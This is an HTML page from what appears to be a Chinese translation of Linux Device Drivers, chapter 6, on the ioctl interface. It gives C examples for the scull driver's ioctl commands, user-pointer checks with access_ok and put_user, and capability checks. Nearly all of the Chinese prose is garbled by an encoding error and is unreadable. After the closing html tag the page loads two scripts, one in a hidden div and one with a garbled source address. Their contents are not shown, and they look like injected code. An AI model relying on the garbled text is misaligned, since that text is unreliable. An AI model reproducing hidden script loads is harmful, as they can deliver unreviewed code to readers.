<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>&#160;6&#160;&#160;߼ַ-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="index.html" title="Linux 豸 Edition 3">
<link rel="prev" href="ch05s08.html" title="5.8.&#160;ٲο">
<link rel="next" href="ch06s02.html" title="6.2.&#160; I/O">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">&#160;6&#160;&#160;߼ַ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch05s08.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch06s02.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="chapter" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title">
<a name="AdvancedCharDriverOperations.chap"></a>&#160;6&#160;&#160;߼ַ</h2></div></div></div>
<div class="toc">
<p><b>Ŀ¼</b></p>
<dl>
<dt><span class="sect1"><a href="ch06.html#ioctl.sect1">6.1. ioctl ӿ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch06.html#ChoosingtheioctlCommands.sect2">6.1.1. ѡ ioctl </a></span></dt>
<dt><span class="sect2"><a href="ch06.html#TheReturnValue.sect2">6.1.2. ֵ</a></span></dt>
<dt><span class="sect2"><a href="ch06.html#ThePredefinedCommands.sect2">6.1.3. Ԥ</a></span></dt>
<dt><span class="sect2"><a href="ch06.html#UsingtheioctlArgument.sect2">6.1.4. ʹ ioctl </a></span></dt>
<dt><span class="sect2"><a href="ch06.html#CapabilitiesandRestrictedOperations.sect2">6.1.5. Ժ޲</a></span></dt>
<dt><span class="sect2"><a href="ch06.html#TheImplementationoftheioctl.sect2">6.1.6. ioctl ʵ</a></span></dt>
<dt><span class="sect2"><a href="ch06.html#DeviceControlWithoutioctl.sect2">6.1.7.  ioctl 豸</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch06s02.html">6.2.  I/O</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch06s02.html#IntroductiontoSleeping.sect2">6.2.1. ˯ߵĽ</a></span></dt>
<dt><span class="sect2"><a href="ch06s02.html#SimpleSleeping.sect2">6.2.2. ˯</a></span></dt>
<dt><span class="sect2"><a href="ch06s02.html#BlockingandNonblockingOperations.sect2">6.2.3. ͷ </a></span></dt>
<dt><span class="sect2"><a href="ch06s02.html#ABlockingIOExample.sect2">6.2.4. һ I/O </a></span></dt>
<dt><span class="sect2"><a href="ch06s02.html#AdvancedSleeping.sect2">6.2.5. ߼˯</a></span></dt>
<dt><span class="sect2"><a href="ch06s02.html#TestingtheScullpipeDriver.sect2">6.2.6.  scullpipe </a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch06s03.html">6.3. poll  select</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch06s03.html#Interactionwithreadandwrite.sect2">6.3.1.  read  write Ľ</a></span></dt>
<dt><span class="sect2"><a href="ch06s03.html#TheUnderlyingDataStructure.sect2">6.3.2. ײݽṹ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch06s04.html">6.4. 첽֪ͨ</a></span></dt>
<dd><dl><dt><span class="sect2"><a href="ch06s04.html#TheDriversPointofView.sect2">6.4.1. Ĺ۵</a></span></dt></dl></dd>
<dt><span class="sect1"><a href="ch06s05.html">6.5. λһ豸</a></span></dt>
<dd><dl><dt><span class="sect2"><a href="ch06s05.html#ThellseekImplementation.sect2">6.5.1. llseek ʵ</a></span></dt></dl></dd>
<dt><span class="sect1"><a href="ch06s06.html">6.6. һ豸ļϵĴȡ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch06s06.html#SingleOpenDevices.sect2">6.6.1.  open 豸</a></span></dt>
<dt><span class="sect2"><a href="ch06s06.html#RestrictingAccesstoaSingleUserataTime.sect2">6.6.2. һζһûƴȡ</a></span></dt>
<dt><span class="sect2"><a href="ch06s06.html#BlockingopenasanAlternativetoEBUSY.sect2">6.6.3.  open Ϊ EBUSY </a></span></dt>
<dt><span class="sect2"><a href="ch06s06.html#CloningtheDeviceonopen.sect2">6.6.4.  open ʱ豸</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch06s07.html">6.7. ٲο</a></span></dt>
</dl>
</div>
<p>ڵ 3 , ǽһ豸, ûдͶȡ. һ豸ṩͬдĹ. װеԹ, һι̵Ĳ-- ǿɰȫǰҴһ߼.</p>
<p>¼鼸ҪĸдȫԵַ豸. Ǵʵ ioctl ϵͳÿʼ, 豸Ƶͨӿ. ǽֺûռͬķ; ڱ½β, һֵʶʹ˯(һ), ʵַ I/O, ֪ͨûռ䵱豸д. Բ鿴ʵּͬ豸ȡ.</p>
<p>۵ĸͨ scull ļ޸İ汾ʾ. һ, еĶʹڴе豸ʵ, ԼЩʹκرӲ. Ϊֹ, ʹӲ, ǽȵ 9 .</p>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="ioctl.sect1"></a>6.1.&#160;ioctl ӿ</h2></div></div></div>
<p>󲿷Ҫ -- ˶д豸 -- ͨ豸иӲƵ. 󲿷豸ɽг򵥵ݴ֮Ĳ; ûռ볣ܹ, , 豸, Ľ, Ϣ, ı䲨, . Щͨ ioctl ֧, ͨͬӵϵͳʵ.</p>
<p>ûռ, ioctl ϵͳԭ:</p>
<pre class="programlisting">
int ioctl(int fd, unsigned long cmd, ...); 
</pre>
<p>ԭЩ͹ Unix ϵͳб, Щ㳣ʾĿĲ. ʵϵͳ, , һϵͳòбĿĲ. ϵͳñһܺöԭ, ΪûɴȡֻͨӲ"". , ԭеĵ㲻ʾһĿĲ, һѡĲ, ͳϱʶΪ char *argp. ЩֻΪֹڱʱͼ.  3 ʵصضĿ(  2  ). һЩò, һЩһֵ, ԼһЩʹָݵָ. ʹһָǴݵ ioctl õķ; 豸ſûռ佻κ.</p>
<p>ioctl õķǽṹʹں˿ʧ. ÿ ioctl , , һ, ĵϵͳ, ûзκ͵ȫķʽ˲Щ. Ҳʹǽṹ ioctl ϵͳһ¹; ,  32-λģʽһû̵ 64-λ ϵͳ. , кܴѹʵֻӵĿƲ, ֻͨκķ. ܵѡǶ(Ժǽ)ʹļϵͳ, Ҫô sysfs Ҫô豸ضļϵͳ. (ǽ 14 ¿ sysfs). , ʵ ioctl ׵ĺֱӵѡ,豸.</p>
<p>ioctl кûռ汾ͬԭ:</p>
<pre class="programlisting">
int (*ioctl) (struct inode *inode, struct file *filp, unsigned int cmd, unsigned long arg);
</pre>
<p>inode  filp ָǶӦӦó򴫵ݵļ fd ֵ, ʹݸ open ͬ. cmd ûﲻıش, ҿѡĲ arg һ unsigned long ʽ, ǷûΪһһָ. ó򲻴ݵ 3 , յ arg ֵ޶. Ϊͼϱر, ܾһЧĲݸ ioctl, κιĴԲ.</p>
<p>뵽, 󲿷 ioctl ʵְһ switch  cmd , ѡȷ. ͬвֵͬ, ǳ򻯱. ͨһԤ. Ƶķǵͷļ; scull.h Ϊ scull . û, Ȼ, ǸͷļȡЩ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ChoosingtheioctlCommands.sect2"></a>6.1.1.&#160;ѡ ioctl </h3></div></div></div>
<p>Ϊ ioctl д֮ǰ, ҪѡӦ. ԱĵһܵķӦѡһС01ʼ, ҴӴ˿ʼ. , гֵɲ. ioctl ӦϵͳΨһ, Ϊֹ豸ȷĴ. Ĳƥ䲻᲻ܷ, һܷԼͼıһǴϵͳĲ, һ FIFO һƵ豸.  ioctl Ψһ, Ӧóõһ EINVAL ǼӦ.</p>
<p>ΪԱΨһ ioctl , ЩѱΪλ. Linux ĵһ汾ʹ 16-λ:  8 λǹ豸"ħ",  8 λһ˳, 豸Ψһ. Ϊ Linus ""(ԼĻ); һõλλֽں. ҵ, Ȼʹϴͳ. ǲò: ıƻĶƳ,ⲻں˿Ը.</p>
<p> Linux ں˹Ϊѡ ioctl , Ӧȼ include/asm/ioctl.h  Documentation/ioctl-number.txt. ͷļ㽫ʹõλ: type(ħ), , ䷽, ͲС. ioctl-number.txt ļоںʹõħ,<sup>[<a name="id433758" href="#ftn.id433758">20</a>]</sup> 㽫ѡԼħұ⽻. ıļҲоΪʲôӦʹùԭ.</p>
<p> ioctl ŵȷʹ 4 λ, еĺ. бнܵ·Ŷ &lt;linux/ioctl.h&gt;.</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>type </span></span></dt>
<dd><p>ħ. ֻѡһ(ڲο ioctl-number.txt֮)ʹ. Ա 8 λ(_IOC_TYPEBITS). </p></dd>
<dt><span class="term"><span>number</span></span></dt>
<dd><p>(˳).  8 λ(_IOC_NRBITS). </p></dd>
<dt><span class="term"><span>direction </span></span></dt>
<dd><p>ݴ͵ķ,漰ݴ. ֵܵ _IOC_NONE(ûݴ), _IOC_READ, _IOC_WRITE,  _IOC_READ|_IOC_WRITE (2򱻴). ݴǴӦóĹ۵; _IOC_READ ˼Ǵ豸, 豸дûռ. עԱһλ,  _IOC_READ  _IOC_WRITE ʹһ߼ AND ȡ.</p></dd>
<dt><span class="term"><span>size </span></span></dt>
<dd><p>漰ûݵĴС. ԱĿϵ, ǳ 13  14 λ. Ϊضϵں _IOC_SIZEBITS ҵֵ. ʹ size ԱǿƵ - ں˲ -- һ. ȷʹԱɰûռĴʹʵ, ҪıĴС. Ҫݽṹ, , ɺ size Ա. ǺܿʹԱ.</p></dd>
</dl></div>
<p>ͷļ &lt;asm/ioctl.h&gt;,  &lt;linux/ioctl.h&gt; , , : _IO(type,nr)(ûв), _IOR(type, nre, datatype)(жݵ), _IOW(type,nr,datatype)(д),  _IOWR(type,nr,datatype)(˫). type  number ԱΪ,  size ԱͨӦ sizeof  datatype õ.</p>
<p>ͷļ, ɱ: _IOC_DIR(nr), _IOC_TYPE(nr), _IOC_NR(nr),  _IOC_SIZE(nr). ǲκЩϸ, Ϊͷļ, ڱԺӴչʾ.</p>
<p>һЩ ioctl  scull . ر, ЩúͻĿò.</p>
<pre class="programlisting">
/* Use 'k' as magic number */
#define SCULL_IOC_MAGIC 'k'
/* Please use a different 8-bit number in your code */

#define SCULL_IOCRESET _IO(SCULL_IOC_MAGIC, 0)
/*
 * S means "Set" through a ptr,
 * T means "Tell" directly with the argument value
 * G means "Get": reply by setting through a pointer
 * Q means "Query": response is on the return value
 * X means "eXchange": switch G and S atomically
 * H means "sHift": switch T and Q atomically
 */
#define SCULL_IOCSQUANTUM _IOW(SCULL_IOC_MAGIC, 1, int)
#define SCULL_IOCSQSET _IOW(SCULL_IOC_MAGIC, 2, int)
#define SCULL_IOCTQUANTUM _IO(SCULL_IOC_MAGIC, 3)
#define SCULL_IOCTQSET _IO(SCULL_IOC_MAGIC, 4)
#define SCULL_IOCGQUANTUM _IOR(SCULL_IOC_MAGIC, 5, int)
#define SCULL_IOCGQSET _IOR(SCULL_IOC_MAGIC, 6, int)
#define SCULL_IOCQQUANTUM _IO(SCULL_IOC_MAGIC, 7)
#define SCULL_IOCQQSET _IO(SCULL_IOC_MAGIC, 8)
#define SCULL_IOCXQUANTUM _IOWR(SCULL_IOC_MAGIC, 9, int)
#define SCULL_IOCXQSET _IOWR(SCULL_IOC_MAGIC,10, int)
#define SCULL_IOCHQUANTUM _IO(SCULL_IOC_MAGIC, 11)
#define SCULL_IOCHQSET _IO(SCULL_IOC_MAGIC, 12)

#define SCULL_IOC_MAXNR 14
</pre>
<p>Դļ弸ûгֵ.</p>
<p>ѡʵ 2 ַ: ָͨͨȷֵ(, һѴڵĹ, ioclt Ӧָͨ뽻ֵ). Ƶ, 2 ַһֵ:ָͨͨ÷ֵ. ЧֻҪֵһ; ֪ͬ, ڴκϵͳ÷ʱ, һֵ(ͬ read  write м), һֵһұûռ errno.<sup>[<a name="id433917" href="#ftn.id433917">21</a>]</sup></p>
<p>"exchange""shift" scull ûرô. ʵ"exchange"ʾν϶ĲԭӵĲ, "shift""tell""query". ʱҪԭӵĲ--ò, ر, ӦóҪúͷ.</p>
<p>ȷûرĺ. ֻ. ʵ, ʹͬŸһһд, Ϊʵʵ ioctl ""λǲͬ, û. ѡκεطʹų, ǲһֵ. Ϊʲôȷĺų֮ǰĶ. չʾһʹŵķ, ɲ.</p>
<p>Ԥ(Ͼ), ioctl  cmd ֵǰںʹ, ڽҲܲ. , , , ǰչʾĸӵȷһ. һ, , 㲻ʹЩλл, ύĴں. ͷļ&lt;linux/kd.h&gt; ʽ, ʹ 16-λĵֵ ioctl . ǸԴΪʹǸʱѭĹ, . ڸıܵɵĲ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheReturnValue.sect2"></a>6.1.2.&#160;ֵ</h3></div></div></div>
<p>ioctl ʵֳһ switch , . ǵûƥһЧĲʱȱʡѡӦʲô? . ں˺ -ENIVAL("Invalid argument"), ΪȷʵһЧ. POSIX ׼, , ˵һʵ ioctl , ô -ENOTTY Ӧ. 뱻 C Ϊ"豸Ĳʵ ioctl", ⳣǳԱҪ. Ȼ, Ȼ൱ձ -EINVAL, ӦһЧ ioctl .</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ThePredefinedCommands.sect2"></a>6.1.3.&#160;Ԥ</h3></div></div></div>
<p> ioctl ϵͳ豸, ںʶ𼸸. עЩ, õ豸ʱ, Լļ֮ǰ. , ѡͬĺŸһ ioctl, 㲻ῴκεĸǸ, ӦóĳЩĶ, Ϊ ioctl ֮ĳͻ.</p>
<p>ԤΪ 3 :</p>
<div class="itemizedlist"><ul type="disc">
<li><p>ɶκļ(, 豸, FIFO,  socket) Щ.</p></li>
<li><p>ֻԳļЩ.</p></li>
<li><p>ļϵͳЩ.</p></li>
</ul></div>
<p>һļϵͳʵִ( chattr ι). 豸дֻԵһȤ, ǵħ "T". 鿴ĹΪϰ; ext2_ioctl Ȥĺ(ұԤڵҪ), Ϊʵ append-only ־ immutable ־.</p>
<p> ioctl Ԥκļ, 豸ļ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>FIOCLEX </span></span></dt>
<dd><p> close-on-exec ־(File IOctl Close on EXec). ־ʹļر, ýִһ³ʱ.</p></dd>
<dt><span class="term"><span>FIONCLEX </span></span></dt>
<dd><p> close-no-exec ־(File IOctl Not CLose on EXec). ָͨļΪ, ԭ FIOCLEX . FIOASYNC Ϊļû߸λ첽֪ͨ(ͬڱ"첽֪ͨ"һ۵). עֱ Linux 2.2.4 汾ں˲ȷʹ޸ O_SYNC ־. Ϊͨ fcntl , ûʹ FIOASYNC , ֻΪ.</p></dd>
<dt><span class="term"><span>FIOQSIZE </span></span></dt>
<dd><p>һļĿ¼ĴС; һ豸ļ, , һ ENOTTY .</p></dd>
<dt><span class="term"><span>FIONBIO</span></span></dt>
<dd><p>"File IOctl Non-Blocking I/O"("ͷ"һ). ޸ filp-&gt;f_flags е O_NONBLOCK ־. ϵͳõĵ 3 ָʾǷ־λ. (ǽڱ¿־Ľɫ). עⳣõĸı־ķʹ fcntl ϵͳ, ʹ F_SETFL .</p></dd>
</dl></div>
<p>беһһµϵͳ, fcntl,  ioctl. ʵ, fcntl ÷ǳ ioctl, Ҳǻһһ(ѡ). ֺ ioctl ҪΪʷԭ:  Unix Կ I/O ʱ, Ǿļ豸ǲͬ. ʱ,  ioctl ʵֵΨһ豸 ttys, Ϊʲô -ENOTTY Ǳ׼ĶԲȷ ioctl Ļش. Ѿı,  fcntl Ϊһϵͳ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="UsingtheioctlArgument.sect2"></a>6.1.4.&#160;ʹ ioctl </h3></div></div></div>
<p>ڿ scull  ioctl ֮ǰ, Ҫ漰һʹĲ. һ, : ֱʹ. һָ, , СЩ.</p>
<p>һָûռ, ǱȷûַЧ. ͼȡһû֤ûṩָܵ²ȷΪ, һں oops, ϵͳ, ߰ȫ. ÿʹõûռַȷļ, ҷһЧ.</p>
<p>ڵ 3 , ǿ copy_from_user  copy_to_user , ǿȫƶݵʹûռ. ЩҲ ioctl ,  ioctl óС, ͨЧز. ʼ, ַУ()ɺ access_ok ʵ,  &lt;asm/uaccess.h&gt;:</p>
<pre class="programlisting">
int access_ok(int type, const void *addr, unsigned long size); 
</pre>
<p>һӦ VERIFY_READ  VERIFY_WRITE, ҪеĶǷǶûռڴд. addr һûռַ, size һֽ. ,  ioctl Ҫûռһ, size  sizeof(int). Ҫдַ, ʹ VERIFY_WRITE, Ϊ VERIRY_READ ĳ.</p>
<p>󲿷ֵں˺, access_ok һֵ: 1 ǳɹ(ȡû) 0 ʧ(ȡ). ؼ, Ӧ -EFAULT .</p>
<p> access_okжȤĶҪע. , Уڴȡ; ֻ鿴ڴкȨ޵ڴ淶Χ. ر, access_ok ȷַָں˿ռڴ. 2, 󲿷벻Ҫ access_ok. ڴȡΪ㸺. , ʾʹ, Աɼ.</p>
<p>scull Դ ioclt еλ,  switch ֮ǰ:</p>
<pre class="programlisting">
int err = 0, tmp;
int retval = 0;
/*
 * extract the type and number bitfields, and don't decode
 * wrong cmds: return ENOTTY (inappropriate ioctl) before access_ok()
 */
if (_IOC_TYPE(cmd) != SCULL_IOC_MAGIC)
        return -ENOTTY;
if (_IOC_NR(cmd) &gt; SCULL_IOC_MAXNR)
        return -ENOTTY;

/*
 * the direction is a bitmask, and VERIFY_WRITE catches R/W
 * transfers. `Type' is user-oriented, while
 * access_ok is kernel-oriented, so the concept of "read" and
 * "write" is reversed
 */
if (_IOC_DIR(cmd) &amp; _IOC_READ)
        err = !access_ok(VERIFY_WRITE, (void __user *)arg, _IOC_SIZE(cmd));
else if (_IOC_DIR(cmd) &amp; _IOC_WRITE)
        err = !access_ok(VERIFY_READ, (void __user *)arg, _IOC_SIZE(cmd));
if (err)
        return -EFAULT;
</pre>
<p>ڵ access_ok ֮, ɰȫؽĴ.  copy_from_user  copy_to_user_ , ԱһΪʹõݴС(1, 2, 4,  8 ֽ)Żĺ. Щб, Ƕ &lt;asm/uaccess.h&gt;:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>put_user(datum, ptr)</span></span></dt>
<dd></dd>
<dt><span class="term"><span>__put_user(datum, ptr)</span></span></dt>
<dd>
<p>Щ궨д datum ûռ; Կ, Ӧ copy_to_user ۺʱҪ͵ֵʱ. Щѱдκ͵ָ뵽 put_user, ֻҪһûռַ. ͵ݴС prt , ڱʱʹ sizeof  typeof ȱڽȷ. ,  prt һ char ָ, һֽ, Լ 2, 4,  ܵ 8 ֽ.</p>
<p>put_user ȷܹдڴַ. ڳɹʱ 0, ڴʱ -EFAULT. __put_user иٵļ( access_ok), Ȼܹʧָڴûǲд. , __put_user ӦֻڴѾ access_ok ʱ.</p>
<p>ΪһͨõĹ, ʵһ read ʱ,  __put_user ʡ, ߵ㿽ʱ, , ڵһݴ֮ǰ access_ok һ, ͬ ioctl ʾ.</p>
</dd>
<dt><span class="term"><span>get_user(local, ptr)</span></span></dt>
<dd></dd>
<dt><span class="term"><span>__get_user(local, ptr)</span></span></dt>
<dd><p>Щ궨ûռյ.  put_user  __put_user, ෴򴫵. ȡֵ洢ڱر local; ֵָǷɹ. ٴ, __get_user ӦֻѾʹ access_ok Уĵַ.</p></dd>
</dl></div>
<p>һʹһгĺһʺضСֵ, һԱϢ, "coversion to non-scalar type requested". Щ, ʹ copy_to_user  copy_from_user.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="CapabilitiesandRestrictedOperations.sect2"></a>6.1.5.&#160;Ժ޲</h3></div></div></div>
<p>ȡһ豸豸ļϵȨ, ز漰Ȩļ. , Щ, ڱ֤κû豸Ķдɵĵط, һЩƲȻӦܾ. , еĴŴûӦܹȱʡС, һѾһ豸дȨ޵ûӦȻܱܾʽ. , жļȷûܹбĲ.</p>
<p>ͳ unix ϵͳԳûʻȨ. ζȨһȫ--ȫ޵Ķ -- ûκ, û߶. Linux ںṩһϵͳ, Ϊ. һϵͳȫ-ȫģʽ, ҴȨΪ. ַʽ, һû(ǳ)ɱȨһضȨй©, ޹صĲ. ںȨʹ,  2 ϵͳ capget  capset, Ǳûռ.</p>
<p>ȫ &lt;linux/capability.h&gt; ҵ. ЩǶϵͳΨһõ; ߻ϵͳԱ, ܲ޸ںԴµ. 豸д߿ܸȤЩһӼ, :</p>
<div class="variablelist"><dl>
<dt><span class="term">CAP_DAC_OVERRIDE <span></span></span></dt>
<dd><p>ƷļĿ¼ϵĴȡ(ݴȡ,  DAC).</p></dd>
<dt><span class="term">CAP_NET_ADMIN <span></span></span></dt>
<dd><p>, ЩܹӰӿڵ.</p></dd>
<dt><span class="term">CAP_SYS_MODULE <span></span></span></dt>
<dd><p>ػȥںģ.</p></dd>
<dt><span class="term">CAP_SYS_RAWIO <span></span></span></dt>
<dd><p> "raw" I/O . Ӱȡ豸˿ڻֱӺ USB 豸ͨѶ.</p></dd>
<dt><span class="term">CAP_SYS_ADMIN <span></span></span></dt>
<dd><p>һ-ȫ, ṩϵͳĴȡ.</p></dd>
<dt><span class="term">CAP_SYS_TTY_CONFIG <span></span></span></dt>
<dd><p> tty .</p></dd>
</dl></div>
<p>ڽһȨ֮ǰ, һ豸Ӧýкʵ; ܵû̽зǷĲ, ϵͳȶͰȫлĺ. ͨ capable е( &lt;linux/sched.h&gt;):</p>
<pre class="programlisting">
 int capable(int capability); 
</pre>
<p> scull , κûѯ quantum  quantum ĴС. ֻȨû, , ɸıЩֵ, ΪʵֵܻܺӰϵͳ. Ҫʱ, ioctl  scull ʵּûȨ, :</p>
<pre class="programlisting">
 if (! capable (CAP_SYS_ADMIN))
 return -EPERM;
</pre>
<p>ȱһضʱ, CAP_SYS_ADMIN ѡ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheImplementationoftheioctl.sect2"></a>6.1.6.&#160;ioctl ʵ</h3></div></div></div>
<p>ioctl  scull ʵֻ豸ò, :</p>
<pre class="programlisting">
switch(cmd)
{
case SCULL_IOCRESET:
        scull_quantum = SCULL_QUANTUM;
        scull_qset = SCULL_QSET;
        break;

case SCULL_IOCSQUANTUM: /* Set: arg points to the value */
        if (! capable (CAP_SYS_ADMIN))

                return -EPERM;
        retval = __get_user(scull_quantum, (int __user *)arg);
        break;

case SCULL_IOCTQUANTUM: /* Tell: arg is the value */
        if (! capable (CAP_SYS_ADMIN))

                return -EPERM;
        scull_quantum = arg;
        break;

case SCULL_IOCGQUANTUM: /* Get: arg is pointer to result */
        retval = __put_user(scull_quantum, (int __user *)arg);
        break;

case SCULL_IOCQQUANTUM: /* Query: return it (it's positive) */
        return scull_quantum;

case SCULL_IOCXQUANTUM: /* eXchange: use arg as pointer */
        if (! capable (CAP_SYS_ADMIN))

                return -EPERM;
        tmp = scull_quantum;
        retval = __get_user(scull_quantum, (int __user *)arg);
        if (retval == 0)

                retval = __put_user(tmp, (int __user *)arg);
        break;

case SCULL_IOCHQUANTUM: /* sHift: like Tell + Query */
        if (! capable (CAP_SYS_ADMIN))
                return -EPERM;
        tmp = scull_quantum;
        scull_quantum = arg;
        return tmp;

default: /* redundant, as cmd was checked against MAXNR */
        return -ENOTTY;
}
return retval;
</pre>
<p>scull  6  scull_qset. Щ͸ scull_quantum һµ, Ҳֵչʾ.</p>
<p>ӵߵĹ۵㿴(ûռ),  6 ִݺͽղķ:</p>
<pre class="programlisting">
int quantum;
ioctl(fd,SCULL_IOCSQUANTUM, &amp;quantum);  /* Set by pointer */
ioctl(fd,SCULL_IOCTQUANTUM, quantum);  /* Set by value */
ioctl(fd,SCULL_IOCGQUANTUM, &amp;quantum);  /* Get by pointer */
quantum = ioctl(fd,SCULL_IOCQQUANTUM);  /* Get by return value */
ioctl(fd,SCULL_IOCXQUANTUM, &amp;quantum);  /* Exchange by pointer */

quantum = ioctl(fd,SCULL_IOCHQUANTUM, quantum); /* Exchange by value */
</pre>
<p>Ȼ, һʵһģʽĻ. ֻΪʾĲͬʽ. , , ݽһµؽ, ֵָͨͨ, Ҫ 2 ּ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="DeviceControlWithoutioctl.sect2"></a>6.1.7.&#160; ioctl 豸</h3></div></div></div>
<p>ʱ豸ͨде豸ʵ. , ڿ̨, ν escape бƶ, ıȱʡɫ, ߽. ʵ豸Ƶĺôûɽͨдݿ豸, ʹ(ʱд)ֻΪ豸ĳ. 豸, ĳҪںҪƵ豸ڵͬһϵͳ.</p>
<p>, setterm ڿ̨(ն), ͨӡ escape . ƳλںͱƵ豸ͬһ̨, Ϊһ򵥵ضù. ÿһԶ tty Ựʱ: escape Զ˱ӡӰ쵽ص tty; Ȼ,  ttys.</p>
<p>ͨӡƵȱ豸˲; , ȷʱвд豸.  ttys ֻǲȷ. һıʾζֻʾ ASCII ַ, ʱַǱд, ҿ, , Ӱ̨. , ܷʾһļĻʱ; ܰκζ, 㳣Ŀ̨ϳִ.</p>
<p>ͨдǵȻʹ÷, ڲôݶֻӦ豸, ң豸.</p>
<p>, ߵеһд, ƶһ 2 ϵ. , "豸"һʽ, ǲд. һ""ĸûκ. , дΪ ASCII תΪ, ݲ. , Щ, 㷢è AT ͨѶ, ҪĲͬǺèͨѶĴڱҲ. ֱ豸Ƶĺôʹ cat ƶ, дͱĴ ioctl .</p>
<p>д, ûʵ ioctl . һеĶʵֲʹ.</p>
<p>ʱ, Ȼ, ѡʹķ:ת write Ϊһͱ ioctl, ѡȫдרʹ ioctl , ʵΪʹһйЩ. תƸԴں˿ռ䵽ûռ, ܸ״, ҰС, ܾʹü򵥵 cat  echo .</p>
</div>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id433758" href="#id433758">20</a>] </sup>, ļάںЩټ.</p></div>
<div class="footnote"><p><sup>[<a name="ftn.id433917" href="#id433917">21</a>] </sup>ʵ, еĵǰʹõ libc ʵ( uClibc)  -4095  -1 ֵ. ҵ, ܹشĸС, ûжô.</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch05s08.html">һҳ</a>&#160;</td>
<td width="20%" align="center">&#160;</td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch06s02.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">5.8.&#160;ٲο&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;6.2.&#160; I/O</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>